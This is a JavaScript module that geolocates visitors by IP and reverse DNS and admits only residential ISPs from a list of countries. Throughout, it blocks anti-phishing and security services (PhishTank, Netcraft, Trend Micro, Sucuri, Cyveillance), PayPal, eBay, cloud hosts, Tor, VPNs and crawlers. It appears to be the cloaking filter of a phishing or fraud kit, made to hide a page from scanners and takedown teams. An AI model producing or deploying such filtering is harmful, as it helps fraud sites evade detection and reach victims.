const checkISP = async () => {
  try {
    // Try multiple IP info services for redundancy
    const services = [
      // "https://ipapi.co/json/",
      // "https://ip-api.com/json/",
      "https://ipinfo.io/json", // Requires API key in production
    ];

    let data = null;
    let error = null;

    // Try each service until one works
    for (const service of services) {
      try {
        const response = await fetch(service);
        if (response.ok) {
          data = await response.json();
          break;
        }
      } catch (e) {
        error = e;
        continue;
      }
    }

    if (!data) throw error || new Error("Failed to get IP info");

    // Normalize data from different services
    const ispInfo = {
      org: (data.org || data.isp || data.as_org || "").toLowerCase(),
      country: data.country || data.country_code || data.countryCode,
      region: data.region || data.regionName,
      city: data.city,
    };

    // Check blocked networks first
    const blockedKeywords = [
      "above",
      "google",
      "softlayer",
      "amazonaws",
      "cyveillance",
      "phishtank",
      "dreamhost",
      "netpilot",
      "calyxinstitute",
      "tor-exit",
      "msnbot",
      "p3pwgdsn",
      "netcraft",
      "trendmicro",
      "ebay",
      "paypal",
      "torservers",
      "messagelabs",
      "sucuri.net",
      "crawler",
      "googlebot",
      "bot",
      "spider",
      "ubuntu",
      "dalvik",
    ];

    if (blockedKeywords.some((keyword) => ispInfo.org.includes(keyword))) {
      return {
        isAllowed: false,
        ispInfo: {
          ...ispInfo,
          reason: "Blocked network detected",
        },
      };
    }

    // Allowed ISPs configuration with common variations
    const allowedISPs = {
      PH: [
        "pldt",
        "philippine long distance",
        "smart communications",
        "globe telecom",
        "dito telecommunity",
        "converge ict",
        "sky cable",
        "eastern communications",
        "bayantel",
        "innove communications",
        "sun cellular",
        "digitel",
      ],
      PT: [
        "nos comunicacoes",
        "meo",
        "vodafone portugal",
        "fundacao para a ciencia",
        "nowo",
        "onitelecom",
        "ar telecom",
        "nos madeira",
        "g9telecom",
      ],
      PL: [
        "orange polska spolka",
        "netia sa",
        "polkomtel sp",
        "t-mobile polska",
        "p4 sp",
        "multimedia polska sp",
        "vectra s.a",
        "naukowa i akademicka",
      ],
      CH: [
        "swisscom",
        "switch",
        "sunrise",
        "green.ch",
        "cern",
        "vtx",
        "migros-genossenschafts-bund",
        "quickline",
        "hoffmann",
        "pim van pelt",
        "abb information",
        "die schweizerische post",
        "init7",
        "zurich insurance",
        "etat de geneve",
      ],
      US: ["DoD Network", "Verizon", "Comcast", "AT&T", "T-Mobile"],
      GB: [
        "virgin",
        "talktalk",
        "british telecommunications",
        "ee limited",
        "sky uk",
        "jisc",
        "vodafone",
        "colt",
        "kcom",
        "claranet",
        "hutchison",
        "daisy",
        "gamma telecom",
        "rackspace",
        "cityfibre",
        "zen internet",
      ],
      MK: [
        "makedonski telekom",
        "a1 makedonija",
        "neotel doo",
        "drustvo za telekomunikaciski",
        "inel internacional",
        "telesmart teleko",
        "net doo",
      ],
      ES: [
        "vodafone",
        "ogic informatica",
        "euskaltel",
        "orange espagne",
        "y telecable",
        "telefonica",
      ],
      DK: [
        "tdc holding",
        "telenor",
        "globalconnect",
        "stofa",
        "dansk kabel",
        "fibia",
        "sentia denmark",
        "dsv panalpina",
        "kmd",
        "post danmark",
        "norlys fibernet",
      ],
      IT: [
        "telecom italia",
        "wind tre",
        "vodafone italia",
        "fastweb spa",
        "consortium",
        "tiscali italia",
        "bt italia",
        "sky italia",
      ],
      CA: [
        "shaw communications",
        "bell canada",
        "rogers communications",
        "telus",
        "videotron telecom",
        "du quebec",
        "gonet",
      ],
      QA: [
        "Ooredoo",
        "Qatar Foundation",
        "Vodafone Qatar",
        "Qatar University",
        "Sidra Medicine",
        "QatarEnergy",
        "Qatar",
      ],
      BH: [
        "Bahrain Telecommunications",
        "ZAIN BAHRAIN",
        "STC BAHRAIN",
        "Kalaam Telecom",
        "Infonas",
        "Etisalcom Bahrain",
        "Bahrain",
      ],
      AE: [
        "EMIRATES TELECOMMUNICATIONS",
        "Earthlink",
        "Emirates Integrated",
        "United Arab Emirates",
      ],
      OM: ["Omani Qatari", "Oman Telecommunications", "Awaser Oman", "Oman"],
      SA: [
        "Saudi Telecom",
        "Etihad Etisala",
        "INTEGRATED COMMUNICATIONS",
        "Mobile Telecommunication",
        "Etihad Atheeb",
        "Middle East Internet",
        "ARABIAN INTERNET",
        "Saudi Arabia",
      ],
      FR: [
        "lycatel",
        "orange",
        "sfr",
        "free",
        "bouygues",
        "Bouygues Telecom SA",
      ],
      LU: [
        "European Commission",
        "SES ASTRA",
        "POST Luxembourg",
        "Proximus Luxembourg",
      ],
      BE: ["proximus", "sfr", "Free", "Orange", "Bouygues", "bbox", "wanadoo"],
      MA: ["meditelecom"],
      DE: [
        "1&1",
        "antec",
        "united-internet",
        "t-online",
        "tkscable",
        "tiscali",
        "telecolumbus",
        "columbus",
        "strato",
        "qbeyond",
        "telefonica",
        "o2",
        "congstar",
        "glasfaser",
        "dokom21",
        "ewe",
        "easybell",
        "ewr",
        "fiete",
        "filiago",
        "fonial",
        "netcologne",
        "vodafone",
        "unitymedia",
        "wilhelm",
        "wilhelm-tel",
        "m-net",
        "hansenet",
        "freenet",
        "telekom",
        "claranet",
        "arcor",
      ],
      CO: [
        "claro",
        "hccnet",
        "telecable",
        "telecafe",
        "teleumbral",
        "telenorte",
        "telmex",
        "telepacifico",
        "teleservicios de cordoba",
        "tigo-une",
        "une telecomunicaciones",
        "urbetv",
        "wimax",
        "wom",
        "win",
        "une",
        "movistar",
        "tigo",
        "etb",
        "une epm",
        "azteca",
        "metrotel",
        "internexa",
        "telebucaramanga",
        "emcali",
        "epm",
        "edatel",
        "telpacifico",
        "aire",
        "opticable",
        "telehuila",
        "conet",
        "orbitel",
        "avantel",
        "direcpath",
        "eikenet",
        "esdatanet",
      ],
      MY: [
        "TM TECHNOLOGY",
        "Binariang Berhad",
        "TTNET-M",
        "DiGi",
        "YTL Communications",
        "Celcom Axiata",
        "Anpple Tech",
      ],
    };

    // Check country allowance
    if (!allowedISPs[ispInfo.country]) {
      return {
        isAllowed: false,
        ispInfo: {
          ...ispInfo,
          reason: `Country not supported (${ispInfo.country})`,
        },
      };
    }

    // More flexible ISP matching
    const isAllowedISP = allowedISPs[ispInfo.country].some((allowedIsp) => {
      // Convert both strings to simple alphanumeric
      const normalizedIsp = ispInfo.org.toLowerCase().replace(/[^a-z0-9]/g, "");

      const normalizedAllowed = allowedIsp
        .toLowerCase()
        .replace(/[^a-z0-9]/g, "");

      // Check if ISP contains any of the allowed keywords
      return (
        normalizedIsp.includes(normalizedAllowed) ||
        normalizedAllowed.includes(normalizedIsp)
      );
    });

    // Add debugging information in development
    if (process.env.NODE_ENV === "development") {
      console.log("ISP Check:", {
        detected: ispInfo.org,
        country: ispInfo.country,
        allowed: isAllowedISP,
      });
    }

    return {
      isAllowed: isAllowedISP,
      ispInfo: {
        ...ispInfo,
        reason: isAllowedISP
          ? "Allowed"
          : `Internet provider not supported: ${ispInfo.org} (${ispInfo.country})`,
      },
    };
  } catch (error) {
    console.error("ISP check error:", error);
    return {
      isAllowed: false,
      ispInfo: {
        reason: "Unable to verify network connection",
      },
    };
  }
};

// Enhanced hostname check with multiple DNS providers
const checkHostname = async (ip) => {
  try {
    const dnsProviders = [
      `https://dns.google/resolve?name=${ip}&type=PTR`,
      `https://cloudflare-dns.com/dns-query?name=${ip}&type=PTR`,
      `https://1.1.1.1/dns-query?name=${ip}&type=PTR`,
    ];

    const results = await Promise.allSettled(
      dnsProviders.map(async (provider) => {
        const response = await fetch(provider, {
          headers: {
            Accept: "application/dns-json",
          },
        });
        return response.json();
      })
    );

    // Get first successful result
    const dnsData = results.find((r) => r.status === "fulfilled")?.value;

    if (!dnsData?.Answer?.[0]?.data) return true;

    const hostname = dnsData.Answer[0].data.toLowerCase();

    const blockedKeywords = [
      "above",
      "google",
      "softlayer",
      "amazonaws",
      "cyveillance",
      "phishtank",
      "dreamhost",
      "netpilot",
      "calyxinstitute",
      "tor-exit",
      "msnbot",
      "p3pwgdsn",
      "netcraft",
      "trendmicro",
      "ebay",
      "paypal",
      "torservers",
      "messagelabs",
      "sucuri.net",
      "crawler",
      "bot",
      "proxy",
      "vpn",
      "tor",
      "hosting",
      "host",
    ];

    return !blockedKeywords.some((keyword) => hostname.includes(keyword));
  } catch (error) {
    console.error("Hostname check error:", error);
    return true; // Allow on error to prevent false positives
  }
};

export { checkISP, checkHostname };
